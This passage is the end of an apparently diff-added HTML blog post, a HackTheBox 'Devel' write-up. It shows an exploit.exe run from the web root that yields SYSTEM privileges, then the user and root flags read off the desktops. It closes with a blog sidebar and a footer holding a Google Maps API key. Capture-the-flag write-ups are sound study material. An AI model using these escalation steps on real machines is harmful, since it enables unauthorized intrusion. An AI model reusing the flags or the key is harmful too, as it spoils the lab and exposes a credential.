+</code></pre><h3 id="step-5---execute-script">Step 5 - Execute script</h3>
+<p>Now all I have to do is execute the application.</p>
+<pre><code>C:\inetpub\wwwroot&gt;exploit.exe
+exploit.exe
+
+c:\Windows\System32&gt;
+</code></pre><p>After execution, I now receive a new command prompt on the Devel system. Now I have to determine what my privileges are to determine if <code>privesc</code> has been successful.</p>
+<pre><code>c:\Windows\System32&gt;whoami
+whoami
+nt authority\system
+</code></pre><p>Anytime <code>nt authority\system</code> is seen it means that I have complete access to the system. I now should be able to access the Administrator and babis folders.</p>
+<h3 id="step-6---find-user-flag">Step 6 - Find user flag</h3>
+<p>I have access to the babis folder now and check the Desktop folder first for the user flag.</p>
+<pre><code>c:\Users\babis\Desktop&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 8620-71F1
+
+ Directory of c:\Users\babis\Desktop
+
+22/07/2020  10:04     &lt;DIR&gt;          .
+22/07/2020  10:04     &lt;DIR&gt;          ..
+22/07/2020  10:04                  0 Contacts
+22/07/2020  10:04                  0 dir
+18/03/2017  02:18                 32 user.txt.txt
+               3 File(s)             32 bytes
+               2 Dir(s)  24.330.985.472 bytes free
+</code></pre><p>I see a user.txt.txt file which I suspect is the user flag for Devel.</p>
+<pre><code>c:\Users\babis\Desktop&gt;more user.txt.txt
+more user.txt.txt
+9ecdd6a3aedf24b41562fea70f4cb3e8
+</code></pre><p>The flag value can be submitted to HackTheBox.</p>
+<h3 id="step-7---find-root-flag">Step 7 - Find root flag</h3>
+<p>I check the Desktop folder in Administrator as well to hopefully find the root flag.</p>
+<pre><code>c:\Users\Administrator\Desktop&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 8620-71F1
+
+ Directory of c:\Users\Administrator\Desktop
+
+18/03/2017  02:17     &lt;DIR&gt;          .
+18/03/2017  02:17     &lt;DIR&gt;          ..
+18/03/2017  02:17                 32 root.txt.txt
+               1 File(s)             32 bytes
+               2 Dir(s)  24.330.981.376 bytes free
+</code></pre><p>I see a file called root.txt.txt which I suspect is the root flag. The use of a double file extension seems a little pointless - perhaps it is meant to distract people.</p>
+<pre><code>c:\Users\Administrator\Desktop&gt;more root.txt.txt
+more root.txt.txt
+e621a0b5041708797c4fc4728bc72b4b
+</code></pre><h2 id="conclusion">Conclusion</h2>
+<p>All things considered, this was a really good learning experience for me.  Aside from understanding the benefit of following a process of discovery, enumeration and exploitation, I learned some new skills in the form of compiling exploits for Windows on Linux and using web shells.  These are skill I am sure I will use again.</p>
+
+					</div>
+					<div class="post-comments">
+						
+					</div>
+				</div>
+			</div>
+      <div class="col-md-4">
+        <aside class="sidebar"><div class="widget widget-latest-post">
+    <h4 class="widget-title">Latest Posts</h4>
+    
+    <div class="media">
+      <a class="pull-left" href="http://192.168.1.191/blog/nibbles/">
+        <img class="media-object" src="/images/blog/nibbles/nibbles_image.jpg" alt="Nibbles HackTheBox - Write-Up">
+      </a>
+      <div class="media-body">
+        <h4 class="media-heading"><a href="http://192.168.1.191/blog/nibbles/">Nibbles HackTheBox - Write-Up</a></h4>
+        <p>This writeup will demonstrate my approach for …</p>
+      </div>
+    </div>
+    
+    <div class="media">
+      <a class="pull-left" href="http://192.168.1.191/blog/jerry/">
+        <img class="media-object" src="/images/blog/jerry/snippet_1.png" alt="Jerry HackTheBox - Write-Up">
+      </a>
+      <div class="media-body">
+        <h4 class="media-heading"><a href="http://192.168.1.191/blog/jerry/">Jerry HackTheBox - Write-Up</a></h4>
+        <p>This writeup will be my approach for …</p>
+      </div>
+    </div>
+    
+    <div class="media">
+      <a class="pull-left" href="http://192.168.1.191/blog/devel/">
+        <img class="media-object" src="/images/blog/devel/cover.jpg" alt="Devel HackTheBox - Write-Up">
+      </a>
+      <div class="media-body">
+        <h4 class="media-heading"><a href="http://192.168.1.191/blog/devel/">Devel HackTheBox - Write-Up</a></h4>
+        <p>The first three &lsquo;HackTheBox&rsquo; writeups …</p>
+      </div>
+    </div>
+    
+    <div class="media">
+      <a class="pull-left" href="http://192.168.1.191/blog/blue/">
+        <img class="media-object" src="/images/blog/blue/cover.jpg" alt="Blue HackTheBox - Write-Up">
+      </a>
+      <div class="media-body">
+        <h4 class="media-heading"><a href="http://192.168.1.191/blog/blue/">Blue HackTheBox - Write-Up</a></h4>
+        <p>This blog piece details my approach for pwning the …</p>
+      </div>
+    </div>
+    
+  </div><div class="widget widget-category">
+    <h4 class="widget-title">Categories</h4>
+    <ul class="widget-category-list">
+      <li><a href="/categories/hackthebox">Hackthebox</a></li>
+    </ul>
+  </div><div class="widget widget-tag">
+    <h4 class="widget-title">Tags</h4>
+    <ul class="widget-tag-list">
+      <li><a href="/tags/apache">Apache</a></li>
+      <li><a href="/tags/distcc">Distcc</a></li>
+      <li><a href="/tags/eternalblue">Eternalblue</a></li>
+      <li><a href="/tags/exploit-compilation">Exploit compilation</a></li>
+      <li><a href="/tags/exploit-modification">Exploit modification</a></li>
+      <li><a href="/tags/ftp">Ftp</a></li>
+      <li><a href="/tags/hackthebox">Hackthebox</a></li>
+      <li><a href="/tags/http">Http</a></li>
+      <li><a href="/tags/linux">Linux</a></li>
+      <li><a href="/tags/misconfiguration">Misconfiguration</a></li>
+      <li><a href="/tags/privesc">Privesc</a></li>
+      <li><a href="/tags/smb">Smb</a></li>
+      <li><a href="/tags/spidering">Spidering</a></li>
+      <li><a href="/tags/tty">Tty</a></li>
+      <li><a href="/tags/tty-shell">Tty shell</a></li>
+      <li><a href="/tags/web-shell">Web shell</a></li>
+      <li><a href="/tags/windows">Windows</a></li>
+    </ul>
+  </div></aside>
+
+      </div>
+		</div>
+	</div>
+</section>
+
+<footer class="footer">
+	<div class="container">
+		<div class="row">
+			<div class="col-md-12">
+				<div class="footer-manu">
+					<ul>
+            
+            <li><a href="http://192.168.1.191/about">About</a></li>
+            
+            <li><a href="http://192.168.1.191/project">Project</a></li>
+            
+            <li><a href="http://192.168.1.191/blog">Blog</a></li>
+            
+					</ul>
+				</div>
+				<p class="copyright">Copyright © 2020 <a href="https://themefisher.com">Themefisher</a> All Rights Reserved</p>
+			</div>
+		</div>
+	</div>
+</footer>
+
+
+
+<script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyCcABaamniA6OL5YvYSpB3pFMNrXwXnLwU&amp;libraries=places"></script>
+
+
+
+
+<script src="http://192.168.1.191/plugins/jQuery/jquery.min.js"></script>
+
+<script src="http://192.168.1.191/plugins/bootstrap/bootstrap.min.js"></script>
+
+<script src="http://192.168.1.191/plugins/slick/slick.min.js"></script>
+
+<script src="http://192.168.1.191/plugins/magnific-popup/jquery.magnific-popup.min.js"></script>
+
+<script src="http://192.168.1.191/plugins/shuffle/shuffle.min.js"></script>
+
+<script src="http://192.168.1.191/plugins/google-map/gmap.js"></script>
+
+
+
+
+<script src="http://192.168.1.191/js/script.min.js"></script>
+
+
+</body>
+
+</html>
